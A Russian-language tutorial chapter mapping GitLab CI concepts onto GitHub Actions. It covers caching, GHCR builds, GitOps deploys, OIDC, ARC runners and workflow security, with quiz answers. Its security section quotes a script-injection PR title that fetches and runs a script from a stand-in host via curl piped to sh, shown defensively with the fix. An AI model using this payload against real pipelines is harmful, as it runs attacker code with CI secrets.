---
title: "16. GitHub Actions"
description: "GitHub Actions для тех, кто знает GitLab CI: workflow, матрицы, кэш, GHCR, GitOps, OIDC, ARC и безопасность"
---

# 16. GitHub Actions (для тех, кто уже знает GitLab CI)

> Роадмап → 4. CI/CD → Инструменты → **GitHub Actions** — второй по массовости CI (open source, продукты).
> Опирается на [05. GitLab CI: основы](/cicd/05-gitlab-ci-basics)–[08. GitLab CI: продвинутое](/cicd/08-gitlab-ci-advanced), [04. GitOps](/cicd/04-gitops),
> [13. Качество и безопасность](/cicd/13-quality-security), OIDC — из блока безопасности.
> **После темы ты умеешь:** переложить GitLab-пайплайн на Actions, собрать образ в GHCR с кэшем,
> выкатить через GitOps-коммит, ходить в AWS без ключей по OIDC, поднять раннеры в k8s (ARC)
> и не попасться на pwn request, script injection и угнанный сторонний action.
> ⚠️ Версии — **проверь, сентябрь 2026**: checkout / setup-python `v7`, cache `v6`, upload-artifact `v7`,
> download-artifact `v8`, build-push-action `v7`, setup-buildx / login `v4`, metadata `v6`,
> configure-aws-credentials `v6`, create-github-app-token `v3`, ARC-чарты `0.14.x`.

---

## 🗺️ Карта темы

```text:no-line-numbers
 СОБЫТИЕ (on:)            WORKFLOW .github/workflows/ci.yml                 ВНЕШНИЙ МИР
 ┌──────────────┐        ┌───────────────────────────────────────┐       ┌──────────────┐
 │ push / PR    │ ─────► │ lint ─┐                                │ ────► │ GHCR         │
 │ dispatch     │        │ test ─┴─► build ─► deploy (environment)│       │ gitops-репо  │
 │ schedule     │        │ steps: uses: (action) | run: (shell)   │       │ AWS по OIDC  │
 │ workflow_call│        └──────────────────┬────────────────────┘       └──────────────┘
 └──────────────┘            runs-on: hosted VM | self-hosted | ARC в k8s
 Сквозное: ${{ contexts }} · GITHUB_TOKEN + permissions · secrets/vars · concurrency · cache/artifacts
```

---

## 1. Словарь перевода: GitLab CI → GitHub Actions

| GitLab CI | GitHub Actions | Нюанс |
|-----------|----------------|-------|
| `.gitlab-ci.yml` (один) | `.github/workflows/*.yml` (сколько угодно) | У каждого файла свои триггеры |
| `stages:` | **стадий нет** — только `needs:` | Джобы параллельны по умолчанию |
| `needs:` | `needs:` | + `needs.<job>.outputs.*`, `needs.<job>.result` |
| `script:` | `steps:` → `run:` (shell) / `uses:` (action) | `uses:` — **чужой код** в твоей джобе |
| `image:` / `services:` | обычно не нужен; `container:` / `services:` | Джоба идёт прямо на VM с кучей софта |
| `rules:` / `workflow:rules` | `on:` (фильтры) + `if:` на джобе/шаге | `on` — стартовать ли workflow |
| `rules: changes` | `on.push.paths` / `paths-ignore` | Только на уровне workflow |
| `when: manual` | `workflow_dispatch` / environment с reviewers | Кнопки на джобе нет |
| `variables:` / CI/CD Variables | `env:` / `vars` (configuration variables) | `vars` — repo / org / environment |
| masked + protected | `secrets` + environment secrets | «protected» ≈ секрет окружения + deployment branches |
| `CI_JOB_TOKEN` / `id_tokens:` | `GITHUB_TOKEN` / `permissions: id-token: write` | Права — через `permissions:` (§9, §11) |
| `artifacts:` / `reports:dotenv` | upload/download-artifact / job `outputs` | Явно в каждой джобе |
| `cache:` | `actions/cache`, `cache:` в `setup-*` | Кэш по ключу **не перезаписывается** |
| `environment:` | `environment:` + Settings → Environments | Там же reviewers и секреты |
| `resource_group` + `interruptible` | `concurrency:` (+ `cancel-in-progress`) | |
| `include:` / `extends:` / `trigger:` | reusable workflow / composite action / `workflow_call` | §8 |
| `parallel: matrix` / runner tags | `strategy.matrix` / `runs-on:` метки | §3, §10 |
| `$CI_COMMIT_SHA`, `$CI_COMMIT_REF_NAME` | <code v-pre>${{ github.sha }}</code>, <code v-pre>${{ github.ref_name }}</code> | В shell — `$GITHUB_SHA` |

**Ломает мозг после GitLab:** (1) стадий нет — без `needs` деплой стартует **одновременно**
с тестами; (2) каждая джоба — **новая чистая VM**; (3) половина пайплайна — сторонние экшены,
то есть чужой код: их пинят, обновляют и ревьюят, как пакеты из npm (§11).

---

## 2. Анатомия workflow

```yaml
name: ci
on:
  push:
    branches: [main]
    tags: ["v*.*.*"]
    paths-ignore: ["docs/**", "**.md"]  # аналог rules:changes (наоборот)
  pull_request:
    branches: [main]                    # PR, нацеленные в main
  workflow_dispatch:                    # кнопка Run workflow / gh workflow run
    inputs: { debug: { type: boolean, default: false } }
  schedule: [{ cron: "0 2 * * 1" }]     # UTC! и только из default branch
permissions: { contents: read }         # ⭐ минимум на весь workflow (§11)
concurrency:                            # новый пуш отменяет старый запуск
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-24.04               # ubuntu-latest тоже 24.04, но «плывёт»
    timeout-minutes: 15                 # ⭐ по умолчанию 360 минут!
    steps:
      - uses: actions/checkout@v7       # без него в джобе НЕТ кода репозитория
      - run: python3 -m unittest discover -s tests -v
```
Ещё: `pull_request_target`/`workflow_run` — привилегированный контекст с секретами (⚠️ §11),
`workflow_call` (§8), `release`, `merge_group`. `pull_request` из форка — **без секретов**, токен
read-only. `schedule` опаздывает, в публичном репо отключается после 60 дней без активности.

**Выражения.** <code v-pre>${{ }}</code> подставляется **до** запуска шага — это шаблонизатор, а не shell.
Контексты: `github`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`, `runner`.
```yaml
if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
if: contains(github.event.pull_request.labels.*.name, 'preview')
if: ${{ !cancelled() }}   # и после падения (отчёты); выражение с ! — только в ${{ }}
if: failure()             # только если что-то до этого упало (по умолчанию — неявный success())
```
**Передача данных** (замена `dotenv`): шаг — `echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"`,
джоба — <code v-pre>outputs: { tag: "${{ steps.v.outputs.tag }}" }</code>, другая — <code v-pre>${{ needs.version.outputs.tag }}</code>.
Для следующих шагов — `>> "$GITHUB_ENV"`, отчёт в UI — `>> "$GITHUB_STEP_SUMMARY"`; `::set-output` удалён.

---

## 3. Матрица

```yaml
test:
  runs-on: ${{ matrix.os }}
  strategy:
    fail-fast: false           # по умолчанию true: упала одна — отменяются остальные
    max-parallel: 4
    matrix:
      os: [ubuntu-24.04, ubuntu-24.04-arm]
      python: ["3.12", "3.13"]
      exclude: [{ os: ubuntu-24.04-arm, python: "3.12" }]
      include: [{ os: ubuntu-24.04, python: "3.14", experimental: true }]
  continue-on-error: ${{ matrix.experimental == true }}
```
Лимит — 256 джоб. Имя в required checks — `test (ubuntu-24.04, 3.13)`: переименовал ось — обнови ruleset.

---

## 4. Кэш и артефакты

**Кэш.** Сначала — встроенный в `setup-*` (80% случаев): `setup-python` с `cache: pip`
и `cache-dependency-path: requirements*.txt`. Для остального:
```yaml
- uses: actions/cache@v6
  with:
    path: ~/.cache/pre-commit
    key: precommit-${{ runner.os }}-${{ hashFiles('.pre-commit-config.yaml') }}
    restore-keys: precommit-${{ runner.os }}-
```
- ⭐ Ключ **неизменяем**: кэш с таким `key` есть — новый не сохранится; без `hashFiles` = вечно
  старый кэш. `restore-keys` — префиксный fallback (частичный hit).
- Ветка видит свой кэш и кэш default branch, соседние — нет. Сохраняется post-шагом, если джоба
  успешна. 10 ГБ на репо бесплатно (с конца 2025 можно докупить); не трогали 7 дней — удаляется.

**Артефакты** — для файлов между джобами:
```yaml
- uses: actions/upload-artifact@v7
  with: { name: linkd-pyz, path: dist/, retention-days: 7, if-no-files-found: error }
# в другой джобе (с needs!):
- uses: actions/download-artifact@v8
  with: { name: linkd-pyz, path: dist }
```
Артефакт неизменяем: в матрице — уникальные имена (<code v-pre>report-${{ matrix.python }}</code>), собирать —
`pattern:` + `merge-multiple: true`. `retention-days` — аналог `expire_in` (по умолчанию 90).
Значения — через `outputs`, образы — через registry. Cache vs artifacts — как в [06. GitLab CI: ядро](/cicd/06-gitlab-ci-core).

---

## 5. Services, Docker и GHCR — ключевые моменты

Полный код — в большом примере (§7). Что в нём важно понимать:
- **Postgres в `services:`** + `--health-cmd "pg_isready"` — раннер ждёт готовности БД до шагов
  (без этого — `connection refused`, как в [07. GitLab CI + Docker](/cicd/07-gitlab-ci-docker)). Джоба на VM ходит
  на `localhost:5432`; джоба в `container:` — по имени сервиса, без `ports`.
- **Docker на hosted-раннере уже есть**, dind не нужен (теория — [07. GitLab CI + Docker](/cicd/07-gitlab-ci-docker)).
  **GHCR:** `packages: write` +
  `docker/login-action` с `GITHUB_TOKEN`; имя образа — **только строчными** (`${GITHUB_REPOSITORY,,}`).
- **Кэш слоёв** — `type=registry,ref=…:buildcache,mode=max` (`type=gha` ест 10 ГБ кэша). Новый пакет в GHCR — **приватный**.

---

## 6. Environments и деплой через GitOps

Settings → Environments → `production`:

| Настройка | Что даёт | Аналог в GitLab |
|-----------|----------|-----------------|
| Required reviewers (до 6) + Prevent self-review | Джоба ждёт чужого аппрува | Protected environment + manual |
| Wait timer | Пауза перед стартом | `when: delayed` |
| Deployment branches and tags | Деплоить сюда могут только `main` / `v*` | Protected branches |
| Environment secrets / vars | Видны **только** джобам с этим environment | Environment scope |

- В джобе: `environment: { name: production, url: … }` + `concurrency` без отмены ≈ `resource_group`.
- ⚠️ В **публичных** репо всё бесплатно, в приватных на Free reviewers нет (проверь в документации).
- С 8.12.2025 deployment branches для `pull_request` сверяются с `refs/pull/N/merge`, для
  `pull_request_target` — с default branch. Плюс **ruleset** на `main`: PR, required checks, без force-push.

**GitOps-коммит** (см. [04. GitOps, §7](/cicd/04-gitops)): CI меняет тег в `linkd-gitops`, Argo CD
подтягивает сам. `GITHUB_TOKEN` действует **только на текущий репо** → ⭐ **GitHub App** +
`create-github-app-token` (токен на час, один репо, не человек); deploy key — ключ вечный; PAT —
привязан к человеку, ❌. Коммиты от `GITHUB_TOKEN` **не запускают** workflow (защита от рекурсии), от App — да.

---

## 7. 🔑 Большой пример: пайплайн linkd

Репо `linkd` (linkd 2.0 из `~/Projects/devops`: `app/`, `tests/`, `requirements.txt`, `Dockerfile`)
и `linkd-gitops` с `apps/linkd/{staging,production}/values.yaml`.

```yaml
# .github/workflows/ci.yml
name: ci
on:
  push: { branches: [main], tags: ["v*.*.*"] }
  pull_request: { branches: [main] }
permissions: { contents: read }
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}   # main не отменяем
jobs:
  lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v7
      - run: pipx run ruff check .

  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix: { python: ["3.12", "3.13"] }
    services:
      postgres:
        image: postgres:17
        env: { POSTGRES_USER: linkd, POSTGRES_PASSWORD: linkd, POSTGRES_DB: linkd }  # одноразовая БД
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U linkd"
          --health-interval 5s --health-timeout 5s --health-retries 10
    env:
      LINKD_DATABASE_URL: postgresql://linkd:linkd@localhost:5432/linkd
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with: { python-version: "${{ matrix.python }}", cache: pip, cache-dependency-path: "requirements*.txt" }
      - run: pip install -r requirements.txt
      - run: python -m unittest discover -s tests -v

  build:
    needs: [lint, test]
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions: { contents: read, packages: write }   # писать может только build
    outputs: { tag: "${{ steps.img.outputs.tag }}" }
    steps:
      - uses: actions/checkout@v7
      - id: img
        run: |
          echo "name=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
          echo "tag=sha-${GITHUB_SHA::7}"          >> "$GITHUB_OUTPUT"
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        if: github.event_name != 'pull_request'
        with: { registry: ghcr.io, username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ${{ steps.img.outputs.name }}
          tags: |
            type=sha,prefix=sha-,format=short
            type=semver,pattern={{version}}
      - uses: docker/build-push-action@v7
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}     # в PR только собираем
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=registry,ref=${{ steps.img.outputs.name }}:buildcache
          cache-to: ${{ github.event_name != 'pull_request' && format('type=registry,ref={0}:buildcache,mode=max', steps.img.outputs.name) || '' }}

  deploy-staging:
    needs: build
    if: github.ref == 'refs/heads/main'
    uses: ./.github/workflows/deploy-gitops.yml    # reusable workflow (§8)
    with: { environment: staging, tag: "${{ needs.build.outputs.tag }}" }
    secrets: inherit

  deploy-prod:
    needs: [build, deploy-staging]
    if: github.ref == 'refs/heads/main'
    uses: ./.github/workflows/deploy-gitops.yml
    with: { environment: production, tag: "${{ needs.build.outputs.tag }}" }   # ждёт reviewers
    secrets: inherit
```
**Что важно:** запись — только у `build`; в PR образ собирается, но не пушится; один образ
`sha-xxxxxxx` на staging и prod (build once, deploy many — см. [01. Концепции CI/CD](/cicd/01-cicd-concepts)). Порядок
в `cond && X || ''` не случаен: `cond && '' || X` вернул бы X всегда (`''` — ложь).

---

## 8. Переиспользование: reusable workflow vs composite action

**Reusable workflow** — целые джобы (аналог `include`). Тот самый `deploy-gitops.yml`:
```yaml
# .github/workflows/deploy-gitops.yml
name: deploy-gitops
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
      tag:         { type: string, required: true }
jobs:
  bump:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    environment: ${{ inputs.environment }}   # ЗДЕСЬ: у вызывающей джобы environment быть не может
    concurrency: { group: "gitops-${{ inputs.environment }}", cancel-in-progress: false }
    steps:
      - id: app-token
        uses: actions/create-github-app-token@v3
        with:
          client-id: ${{ vars.GITOPS_APP_CLIENT_ID }}
          private-key: ${{ secrets.GITOPS_APP_PRIVATE_KEY }}
          repositories: linkd-gitops
      - uses: actions/checkout@v7
        with: { repository: "${{ github.repository_owner }}/linkd-gitops", token: "${{ steps.app-token.outputs.token }}" }
      - name: Bump image tag
        env: { TAG: "${{ inputs.tag }}", ENV_NAME: "${{ inputs.environment }}" }
        run: |
          yq -i '.image.tag = strenv(TAG)' "apps/linkd/${ENV_NAME}/values.yaml"
          git config user.name "linkd-ci[bot]"
          git config user.email "linkd-ci@users.noreply.github.com"
          git commit -am "deploy(${ENV_NAME}): linkd ${TAG}" || { echo "уже ${TAG}"; exit 0; }
          git push
```
Из другого репо — `uses: acme/ci-templates/.github/workflows/deploy-gitops.yml@v1` (пинь тег/SHA);
секреты окружения reusable-джоба берёт сама из своего `environment`, а не от вызывающего.

**Composite action** — набор шагов (аналог `extends`) в `.github/actions/setup-linkd/action.yml`:
```yaml
name: setup-linkd
runs:
  using: composite
  steps:
    - uses: actions/setup-python@v7
      with: { python-version: "3.13", cache: pip }
    - run: pip install -r requirements.txt
      shell: bash                            # ⭐ в composite shell обязателен
```
Вызов — `- uses: ./.github/actions/setup-linkd` (после `checkout`!).

**Выбор:** reusable — джобы целиком (свои `runs-on`, `environment`, `secrets: inherit`), стандарт на
организацию; composite — шаги внутри чужой джобы (секреты только через `inputs`): «поставить окружение».

---

## 9. OIDC: AWS без ключей в секретах

Механика как у GitLab (см. блок безопасности, §6): GitHub подписывает JWT на джобу, STS проверяет
его по trust policy и выдаёт креды на час.
**1.** IAM → Identity providers → OIDC: `https://token.actions.githubusercontent.com`,
audience `sts.amazonaws.com` (thumbprint больше не нужен). **2.** Trust policy роли:
```json
{ "Version": "2012-10-17",
  "Statement": [{ "Effect": "Allow", "Action": "sts:AssumeRoleWithWebIdentity",
    "Principal": { "Federated": "arn:aws:iam::111122223333:oidc-provider/token.actions.githubusercontent.com" },
    "Condition": { "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/linkd:environment:production" } } }] }
```
**3.** Джоба:
```yaml
deploy-aws:
  runs-on: ubuntu-24.04
  environment: production
  permissions: { id-token: write, contents: read }   # перечисляешь ВСЁ — остальное станет none
  steps:
    - uses: aws-actions/configure-aws-credentials@v6
      with: { role-to-assume: "arn:aws:iam::111122223333:role/linkd-deploy-prod", aws-region: eu-central-1 }
    - run: aws sts get-caller-identity
```

| Джоба | `sub` |
|-------|-------|
| Ветка / тег, без environment | `repo:acme/linkd:ref:refs/heads/main` / `…:ref:refs/tags/v1.2.0` |
| ⭐ С `environment:` | `repo:acme/linkd:environment:production` — **ref пропадает!** |
| `pull_request` | `repo:acme/linkd:pull_request` |
| Репо создан / переименован / перенесён после 15.07.2026 | `repo:acme@<owner_id>/linkd@<repo_id>:…` (immutable subject) |

Без условия по `sub` роль примет **любой** репозиторий на GitHub — issuer общий. Immutable `sub`:
старые trust policy для новых репо не совпадут; ID — `gh api repos/acme/linkd --jq '.owner.id, .id'`,
старые репо переходят опт-ином (проверь, сентябрь 2026). Reusable workflow ограничивают `job_workflow_ref`.

**Yandex Cloud** — «федерации сервисных аккаунтов» (Workload Identity Federation):
```bash
yc iam workload-identity oidc federation create --name github \
  --issuer "https://token.actions.githubusercontent.com" --audiences "https://github.com/acme" \
  --jwks-url "https://token.actions.githubusercontent.com/.well-known/jwks"
yc iam workload-identity federated-credential create --service-account-id <sa_id> \
  --federation-id <fed_id> --external-subject-id "repo:acme/linkd:environment:production"
```
В джобе JWT GitHub меняется на IAM-токен (готовые экшены `yc-actions/*` или token exchange через
`https://auth.yandex.cloud/oauth/token`) — точный шаг обмена проверь в документации Yandex Cloud.

---

## 10. Раннеры: hosted, self-hosted, ARC

**GitHub-hosted** (`ubuntu-24.04`, `-arm`, windows, macos) — чистая VM на джобу; **larger runners** —
больше CPU/RAM, статический IP, платно всегда; **self-hosted** — внутренняя сеть, своё железо/GPU,
обслуживание и изоляция на тебе; ⭐ **ARC** — self-hosted в k8s с автоскейлом и эфемерными раннерами.

```bash
# self-hosted на VM (токен: Settings → Actions → Runners → New runner)
./config.sh --url https://github.com/acme/linkd --token <REG_TOKEN> --labels internal --ephemeral
sudo ./svc.sh install && sudo ./svc.sh start   # в workflow: runs-on: [self-hosted, linux, internal]
```

**ARC** (официальные runner scale sets; старый community-ARC `summerwind` — legacy), чарты из OCI
(см. [Helm](/docker/09-compose)):
```bash
helm install arc -n arc-systems --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller
kubectl create secret generic gh-app -n arc-runners --from-literal=github_app_id=123456 \
  --from-literal=github_app_installation_id=7890123 --from-file=github_app_private_key=app.pem
helm install linkd-runners -n arc-runners --create-namespace \
  --set githubConfigUrl="https://github.com/acme" --set githubConfigSecret=gh-app \
  --set minRunners=0 --set maxRunners=10 \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
# в workflow: runs-on: linkd-runners   (имя installation = имя scale set)
```
Listener держит long-poll к GitHub → пришла джоба → контроллер создаёт **эфемерный** под-раннер →
джоба → под удаляется. Docker внутри — `containerMode.type: dind` (privileged!) или `kubernetes`
(контейнеры джобы — отдельными подами). Для org/repo GitHub App лучше PAT.

**Безопасность self-hosted:** ❌ **никогда на публичном репо** — PR из форка = чужой код в твоей сети;
только эфемерные раннеры (иначе джоба оставит процессы, файлы и креды следующей); runner groups
ограничивают, какие репо видят раннер; долгоживущих ключей на хосте нет — в облако по OIDC.

---

## 11. Безопасность workflow

Общая теория — [13. Качество и безопасность](/cicd/13-quality-security). Здесь — дыры, специфичные для Actions.

1. **`GITHUB_TOKEN` — минимум прав** (у новых репо default read-only — проверь Settings → Actions).
   В `pull_request` из форка секретов нет, токен read-only, первые PR новичков ждут аппрува.
2. **`pull_request_target` / «pwn request».** Workflow из default branch, но с секретами и
   write-токеном: checkout кода PR + его запуск (`pip install`, тесты) = чужой код с твоими секретами.
   С 8.12.2025 событие всегда берёт workflow и ref из default branch; `actions/checkout@v7` (июнь 2026,
   потом бэкпорт в поддерживаемые мажоры) **отказывается** качать код форка в `pull_request_target`/
   `workflow_run` без `allow-unsafe-pr-checkout: true`. Правило: только метаданные, без кода PR.
3. **Script injection.** <code v-pre>${{ }}</code> вклеивается в текст скрипта до shell:
   ```yaml
   # ❌ заголовок PR: a"; curl -s https://evil.example/x.sh | sh; echo "
   - run: echo "Проверяю ${{ github.event.pull_request.title }}"
   # ✅ недоверенные данные — только через env
   - env: { TITLE: "${{ github.event.pull_request.title }}" }
     run: echo "Проверяю $TITLE"
   ```
   Недоверенное: title/body PR и issue, комментарии, `head_ref`, сообщения коммитов, email авторов.
4. **Пин сторонних экшенов по полному SHA.** Тег — изменяемый указатель: в марте 2025 теги
   `tj-actions/changed-files` перевесили на вредоносный коммит, печатавший секреты в логи.
   `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1`. С августа 2025 есть
   политика «Require actions to be pinned to a full-length commit SHA» и блокировка `!owner/action`.
   В конспекте экшены по тегу для читаемости; в проде — SHA.
5. **Dependabot** обновляет экшены вместе с SHA и комментарием версии — `.github/dependabot.yml`:
   ```yaml
   version: 2
   updates:
     - { package-ecosystem: github-actions, directory: /, schedule: { interval: weekly },
         cooldown: { default-days: 7 } }   # не брать релиз в первый же день (проверь поддержку)
   ```
6. **Линтеры:** `actionlint` (синтаксис, выражения, shellcheck в `run:`) и `zizmor` (injection,
   pwn request, лишние права, непиненные экшены) — в pre-commit и CI.

---

## 12. Отладка и стоимость

| Инструмент | Что даёт |
|------------|----------|
| Re-run jobs → **Enable debug logging**; `ACTIONS_STEP_DEBUG=true` (переменная/секрет) | Подробный лог шагов; `ACTIONS_RUNNER_DEBUG` — лог раннера |
| `gh run view <id> --log-failed`, `gh run rerun <id> --failed`, `gh workflow run ci.yml -f debug=true` | Логи упавшего, перезапуск упавшего, dispatch из терминала |
| `act pull_request -j test` (nektos/act) | Прогон локально в Docker |

**Пределы `act`:** образы не равны настоящим раннерам, нет OIDC, environments и reviewers, кэш
и артефакты — частично, токен передаёшь сам (`-s GITHUB_TOKEN="$(gh auth token)"`). Проверка — на GitHub.

**Деньги** (проверь, сентябрь 2026): публичные репо на стандартных hosted-раннерах — бесплатно;
приватные — квота по плану (Free — 2000 мин/мес), дальше поминутно: с 1.01.2026 цены снижены до 39%,
Linux 2-core ≈ $0.006/мин, arm64 ≈ $0.005, Windows ≈ $0.010, macOS ≈ $0.062. Self-hosted — без
платы GitHub: сбор $0.002/мин, анонсированный в декабре 2025, **отложили** через двое суток и
не ввели. Минуты утекают через `timeout-minutes` 360 по умолчанию, нет `cancel-in-progress`/`paths-ignore`.

---

## 🧪 Мини-лаба: первый зелёный workflow за 20 минут

1. Создай **публичный** репо `linkd` с приложением из `~/Projects/devops`.
2. Добавь `ci.yml` только с `lint` и `test` из §7. Был ли cache hit в `setup-python` на втором
   запуске? Сломай тест в ветке, открой PR — проверка краснеет; ошибка — `gh run view --log-failed`.
3. Ruleset на `main` с required checks `lint`, `test (3.12)`, `test (3.13)`; прогони `actionlint`
   и `zizmor .github/workflows/` — исправь всё найденное.

---

## 🪤 Грабли

| Грабля | Что не так | Правильно |
|--------|-----------|-----------|
| Нет `needs` у deploy | Деплой параллельно с тестами | `needs: [test, build]` |
| `permissions` на джобе без `contents: read` | Неперечисленное = `none`, checkout падает в приватном репо | Перечисляй всё нужное |
| Ключ кэша без `hashFiles` | Ключ неизменяем → вечно старый кэш | `hashFiles('requirements*.txt')` |
| Trust policy с `ref:` у джобы с environment | `sub` с environment → AccessDenied | `repo:org/repo:environment:prod` |
| `ghcr.io/Org/Repo` | Нужны строчные | `${GITHUB_REPOSITORY,,}` / metadata-action |
| <code v-pre>${{ github.event.* }}</code> в `run:` | Script injection | Через `env:` |
| Сторонний экшен по тегу | Тег перевесят | Полный SHA + Dependabot |
| Self-hosted на публичном репо | PR из форка на твоём хосте | Hosted / приватные репо, ephemeral |

---

## 💼 Как это в DevOps

- В вакансиях «GitLab CI **или** GitHub Actions» — покажи, что переносишь **принципы**,
  а синтаксис — таблица §1. Одна лаба на двух CI — сильный пункт резюме.
- На ревью workflow первым делом смотрят `permissions`, `pull_request_target`, <code v-pre>${{ }}</code> в `run:`,
  непиненные экшены и `timeout-minutes` — это же спрашивают на собесе про безопасность CI.
- OIDC вместо `AWS_SECRET_ACCESS_KEY` — быстрый вклад в безопасность; в компаниях с десятками
  репо живут `ci-templates` с reusable workflows и ARC. Инциденты Actions — про права и доверие.

---

## 📌 Шпаргалка

| Хочу | Как |
|------|-----|
| Только на main / по тегу / кнопкой | `push: branches: [main]` / `tags: ["v*.*.*"]` / `workflow_dispatch` |
| Передать значение / файл | `$GITHUB_OUTPUT` → `outputs` → `needs.x.outputs.y` / upload `v7` + download `v8` |
| Кэш pip / БД в тестах | `setup-python` + `cache: pip` / `services: postgres` + `--health-cmd` |
| Пуш в GHCR | `packages: write` + login `GITHUB_TOKEN` |
| Не деплоить параллельно / отменять старые PR | `concurrency` + `cancel-in-progress: false` / `true` |
| Аппрув прода | Environment с required reviewers |
| AWS без ключей | `id-token: write` + configure-aws-credentials `v6` + `sub` в trust |
| Общий пайплайн / общие шаги | `on: workflow_call` / `runs: using: composite` |
| Раннеры в k8s / отладка | ARC: чарты `gha-runner-scale-set*` / Re-run with debug logging |

---

## 🧠 Что запомнить

1. Стадий нет: порядок задаёт только `needs`; каждая джоба — новая чистая VM.
2. `on:` решает, стартует ли workflow; `if:` — джоба или шаг. `schedule` — UTC и только default branch.
3. Секреты — `secrets`, не-секреты — `vars`; environment secrets — только джобам с этим environment.
4. `permissions: contents: read` на workflow и точечное расширение в джобах.
5. Ключ кэша неизменяем — строй его из `hashFiles`; файлы — артефактами, значения — `outputs`.
6. Прод: environment с required reviewers + deployment branches + `concurrency` без отмены.
7. GitOps-коммит в другой репо — токеном GitHub App, не `GITHUB_TOKEN` и не личным PAT.
8. Reusable workflow ≈ `include` (джобы), composite action ≈ `extends` (шаги).
9. OIDC: `id-token: write`; с environment в `sub` — environment, а не ref; новые репо — immutable `sub`.
10. Self-hosted — никогда на публичных репо; в k8s — ARC с эфемерными раннерами и GitHub App.
11. `pull_request_target` + код PR = pwn request; событие в `run:` без `env:` = injection;
    тег стороннего экшена = чужой код завтра → SHA + Dependabot. Плюс всегда `timeout-minutes`.

---

## Задачи

> Лаба: **публичный** репо `linkd` на GitHub (linkd 2.0 с PostgreSQL из `~/Projects/devops`)
> + репо `linkd-gitops`. Публичный — чтобы environments с reviewers были доступны на Free.
> Эксперименты с injection и pwn request — только в песочном репо и с нагрузкой `echo pwned`.

---

### Блок A. Теория

**A1.** Назови три главных отличия модели исполнения GitHub Actions от GitLab CI.

<details><summary>Ответ</summary>

(1) Стадий нет — порядок только через `needs`; (2) каждая джоба — новая чистая VM (или под),
общих файлов нет; (3) большая часть шагов — экшены, то есть чужой код, который пинят и ревьюят.
Плюс много workflow-файлов со своими триггерами и права токена в `permissions`.

</details>

**A2.** Сопоставь с Actions: `stages`, `rules`, `variables` / CI/CD Variables, `artifacts`, `dotenv`,
`cache`, `environment`, `include`, `extends`, `resource_group`, `interruptible`.

<details><summary>Ответ</summary>

`stages` → `needs`; `rules` → `on:` + `if:`; `variables` → `env:`, CI/CD Variables → `vars`
и `secrets`; `artifacts` → upload/download-artifact; `dotenv` → `$GITHUB_OUTPUT` + job `outputs`;
`cache` → `actions/cache` / `cache:` в `setup-*`; `environment` → `environment` + Settings →
Environments; `include` → reusable workflow; `extends` → composite action; `resource_group` →
`concurrency` без отмены; `interruptible` → `concurrency` + `cancel-in-progress: true`.

</details>

**A3.** Чем `on:` отличается от `if:`? Где аналоги `workflow:rules` и `rules: changes`?

<details><summary>Ответ</summary>

`on:` решает, запускать ли workflow (события, `branches`, `tags`, `paths`); `if:` — выполнять
ли джобу или шаг. `workflow:rules` ≈ `on:` с фильтрами; `rules: changes` ≈ `paths`/`paths-ignore`
(только на уровне workflow).

</details>

**A4.** Чем `pull_request` отличается от `pull_request_target`? Что изменилось 8 декабря 2025?

<details><summary>Ответ</summary>

`pull_request` исполняет код PR; для форков — без секретов и с read-only токеном.
`pull_request_target` исполняет workflow base-репо с секретами и write-токеном — безопасно, только
пока код PR не запускается. С 8.12.2025 он всегда берёт workflow и ref из default branch, а
deployment branches сверяются с default branch.

</details>

**A5.** Как передать значение из шага в шаг и из джобы в джобу? Что заменило `::set-output`?

<details><summary>Ответ</summary>

Шаг → шаг: `echo "k=v" >> "$GITHUB_OUTPUT"` + `id:`, читать `steps.<id>.outputs.k`
(env — `>> "$GITHUB_ENV"`). Джоба → джоба: `outputs:` + `needs.<job>.outputs.k`. `::set-output`
удалён в пользу файлов `$GITHUB_OUTPUT`/`$GITHUB_ENV`.

</details>

**A6.** Почему ключ кэша обязан содержать `hashFiles(...)`? Что такое `restore-keys`? Какие кэши видит фича-ветка?

<details><summary>Ответ</summary>

Кэш по ключу неизменяем: ключ есть — новый не сохранится; без `hashFiles` ключ вечен, кэш
протухает. `restore-keys` — префиксы для частичного совпадения. Фича-ветка видит свой кэш и кэш
default branch (для PR — и base-ветки), но не соседние ветки.

</details>

**A7.** Как подключить PostgreSQL к тестам и дождаться готовности? Какой адрес у сервиса на VM и в `container:`?

<details><summary>Ответ</summary>

`services: postgres:` с `env`, `ports: ["5432:5432"]` и `options: --health-cmd "pg_isready" …` —
раннер ждёт healthy до шагов. На VM — `localhost:5432`; в `container:` — `postgres:5432` без `ports`.

</details>

**A8.** Что нужно для пуша в GHCR? Почему имя образа приводят к нижнему регистру?

<details><summary>Ответ</summary>

`permissions: packages: write` + `docker/login-action` (`ghcr.io`, `github.actor`,
`secrets.GITHUB_TOKEN`) + build-push. Имена в registry только строчные, а `github.repository`
бывает с заглавными (`Nurdaulet/linkd`) — buildx упадёт с `repository name must be lowercase`.

</details>

